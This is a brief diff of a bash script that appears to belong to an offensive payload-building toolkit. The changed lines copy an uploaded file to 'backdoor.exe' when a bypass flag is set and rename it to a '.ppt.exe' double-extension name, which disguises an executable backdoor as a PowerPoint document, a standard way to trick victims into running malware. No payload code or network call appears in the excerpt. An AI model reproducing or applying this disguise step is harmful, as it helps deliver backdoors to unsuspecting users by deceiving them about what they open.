@@ -222,10 +222,12 @@ cat << !
 
     # insert .ppt hidden extension
     echo ${BlueF}[☆]${white} Adding agent hidden extensions '->' ${GreenF}done... ${Reset};
-    if [ "$ByPa" = "NO" ]; then
-      cp $UpL  $IPATH/output/backdoor.exe > /dev/null 2>&1
+    # bypass wine64 issue
+    if [ "$ByPa" = "YES" ]; then
+      cp $UpL $IPATH/output/backdoor.exe > /dev/null 2>&1
     fi
 
+    # chose ruby or bash transformation
     if [ "$tRan" = "YES" ]; then
       mv $IPATH/output/backdoor.exe  $IPATH/output/$MiP.ppt.exe > /dev/null 2>&1
     else
